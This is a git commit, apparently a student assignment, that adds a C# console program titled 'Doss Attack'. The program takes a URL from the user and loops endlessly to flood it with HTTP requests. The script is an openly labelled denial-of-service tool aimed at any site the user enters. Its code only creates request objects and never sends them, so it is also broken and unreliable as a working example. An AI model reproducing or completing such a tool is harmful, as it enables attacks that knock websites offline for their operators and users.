ef861f47446ceb2821336d9772a2714d483c9b1f
kaleab <kaleabterefe7@gmail.com>
2018-04-03 22:06:56 -0700

    assigment_Dos_attake

---
+++ dosattake/dosattake/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Web;
+
+namespace dosattake
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			Console.ForegroundColor = ConsoleColor.Green;
+			for (; ; )
+			{
+				Console.Title = "Doss Attack"; 
+				Console.Write("Write url : ");
+				string x = Console.ReadLine();
+				while (true)
+				{
+					try
+					{
+						HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(x);
+
+						Console.WriteLine(x);
+					}
+					catch (Exception ex)
+					{
+						Console.WriteLine(ex.Message);
+						break;
+					}
+				}
+
+
+			}
+			}
+	}
+}
